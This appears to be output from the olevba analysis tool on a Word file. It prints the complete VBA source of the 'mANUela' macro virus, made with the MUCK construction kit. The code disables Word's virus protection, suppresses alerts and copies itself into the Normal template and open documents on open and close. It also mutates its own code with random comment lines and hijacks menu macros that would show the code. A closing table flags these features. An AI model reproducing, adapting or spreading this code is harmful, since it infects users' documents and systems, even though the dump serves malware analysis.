olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck-based-9b11271114b4c9a78eb6148e4ab13272ee7facdf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck-based-9b11271114b4c9a78eb6148e4ab13272ee7facdf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO mANUela.bas 
in file: Virus.MSWord.Muck-based-9b11271114b4c9a78eb6148e4ab13272ee7facdf - OLE stream: 'Macros/VBA/mANUela'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Mini ULTRAS Construction Kit (MUCK)
'ULTRAS 1998

'VirusName: mANUela
'Author Name: Doctor Rave
'Date and Time:22/11/98 13.16.52


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'AutoOpen
    Rem 208,377 72,45839    41,81892    141,3382    18,56623
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 208,377 72,45839    41,81892    141,3382    18,56623
    Rem 87,32473    54,31307    72,67326    64,26416    7,349073
Sub AutoOpen()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
    Rem 420,1675    49,61677    55,63622    26,86423    23,51893
Options.VirusProtection = False
DocInfect = False
    Rem 0,1097551   42,94353    105,1288    97,92252    40,54318
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "mANUela" Then
DocInfect = True
    Rem 422,0655    7,834387    71,018  49,13043    42,7548
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "mANUela" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
    Rem 452,1477    10,43364    4,621725    62,17049    26,83576
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="mANUela", Object:=wdOrganizerObjectProjectItems
    Rem 242,9122    8,509574    159,9063    121,7117    0,7694919
Options.SaveNormalPrompt = False
End If
    Rem 242,9122    8,509574    159,9063    121,7117    0,7694919
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="mANUela", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    Rem 73,00089    13,02573    103,4539    73,81318    20,22557
    Rem 418,3166    50,53939    100,4227    77,12215    4,800717
    Rem 73,00089    13,02573    103,4539    73,81318    20,22557
End If
    Rem 418,3166    50,53939    100,4227    77,12215    4,800717
Application.DisplayAlerts = wdAlertsAll
    Rem 107,0534    38,43798    40,73631    61,30918    2,201759
    Rem 173,8149    24,07764    151,7714    176,3693    19,66734
    Rem 173,8149    24,07764    151,7714    176,3693    19,66734
Call Polymorphic
End Sub


    Rem 247,0382    6,455307    101,4995    73,8066 47,06072
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'AutoClose
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub AutoClose()
On Error Resume Next
Call Payload
    Rem 437,6887    69,71567    8,997898    170,9202    17,83692
    Rem 437,6887    69,71567    8,997898    170,9202    17,83692
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
    Rem 48,85577    62,71962    73,54253    135,6639    29,20863
    Rem 166,0729    39,19158    24,90609    85,40265    12,60612
Options.VirusProtection = False
DocInfect = False
    Rem 122,7279    4,447479    39,01523    176,234 2,984896
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "mANUela" Then
DocInfect = True
End If
Next
    Rem 223,9354    16,61018    52,75775    17,17723    28,89984
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "mANUela" Then
    Rem 93,73782    69,16276    94,18057    135,8835    45,46627
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="mANUela", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
    Rem 349,0358    4,280362    94,79332    84,36602    14,61011
End If
    Rem 349,0358    4,280362    94,79332    84,36602    14,61011
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="mANUela", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
    Rem 315,9908    73,0974 133,5707    4,073256    26,62467
Application.DisplayAlerts = wdAlertsAll
    Rem 315,9908    73,0974 133,5707    4,073256    26,62467
Call Polymorphic
    Rem 131,7509    24,15584    123,9584    2,523175    37,27546
    Rem 45,52377    8,241811    127,8215    51,20645    2,236809
    Rem 131,7509    24,15584    123,9584    2,523175    37,27546
    Rem 45,52377    8,241811    127,8215    51,20645    2,236809
    Rem 448,6724    72,87714    36,29856    125,1208    48,02016
End Sub

    Rem 448,6724    72,87714    36,29856    125,1208    48,02016
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 246,642 12,50418    150,1672    117,8099    24,79828
'ToolsMacro macro
    Rem 294,7586    21,10344    44,69473    149,3643    40,4055
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsMacro()
    Rem 294,7586    21,10344    44,69473    149,3643    40,4055
Call Polymorphic
Beep
    Rem 116,7662    7,191725    4,952097    58,08918    38,71632
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ViewVBCode macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 422,5976    42,417  14,34262    136,3913    19,69026
Sub ViewVBCode()
Call Polymorphic
    Rem 453,531 27,18449    79,23381    74,33421    34,06881
    Rem 148,4238    50,65431    33,20978    33,48243    28,58459
Beep
End Sub
    Rem 148,4238    50,65431    33,20978    33,48243    28,58459

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ToolsCustomize macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsCustomize()
Call Polymorphic
Beep
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'FileTemplates macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub FileTemplates()
Call Polymorphic
    Rem 322,6122    3,628221    66,24523    155,2715    38,73352
Beep
    Rem 8,535052    16,82949    11,83253    18,98148    16,25303
    Rem 322,6122    3,628221    66,24523    155,2715    38,73352
End Sub


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Polymorphic macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Polymorphic()
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("mANUela").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
    Rem 244,9021    32,5137 135,5593    148,7206    32,94895
    Rem 195,7688    54,23582    80,39262    92,47275    22,68602
    Rem 195,7688    54,23582    80,39262    92,47275    22,68602
Application.VBE.ActiveVBProject.VBComponents("mANUela").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Payload macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Payload()
On Error Resume Next
U = Int(Rnd() * 30) + 1
If Day(Now()) = MUCK Then
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

